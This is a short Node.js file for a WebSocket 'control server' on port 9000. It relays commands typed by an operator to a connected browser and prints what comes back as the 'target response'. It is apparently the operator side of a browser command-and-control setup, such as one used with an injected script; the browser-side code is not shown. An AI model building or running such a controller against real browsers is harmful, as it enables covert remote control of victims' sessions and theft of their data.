const http = require("http");
const WebSocket = require("ws");

const server = http.createServer();
const wss = new WebSocket.Server({server});
let browserConnection = null;

wss.on("connection", (socket) => 
{
    console.log("[CONTROL] Browser connected");
    browserConnection = socket;

    socket.on("message", (data) =>
    {
        console.log("\n[TARGET RESPONSE]");
        console.log(data.toString());
    });

    socket.on("close", () => 
    {
        console.log("[CONTROL] Browser disconnected");
        if (browserConnection === socket) 
        {
            browserConnection = null;
        }
    });
});

process.stdin.setEncoding("utf8");
console.log("Control server started.");

process.stdin.on("data", (input) => 
{
    const command = input.trim();
    if (!browserConnection) 
    {
        console.log("[-] No browser connected");
        return;
    }

    if (browserConnection.readyState !== WebSocket.OPEN) 
    {
        console.log("[-] Browser WebSocket is not open");
        return;
    }

    console.log("[CONTROL → BROWSER]",command);
    browserConnection.send(command);
});

server.listen(9000, () => 
{
    console.log("Control server: ws://controlserver.local:9000");
});


//node control/server.js -> to run
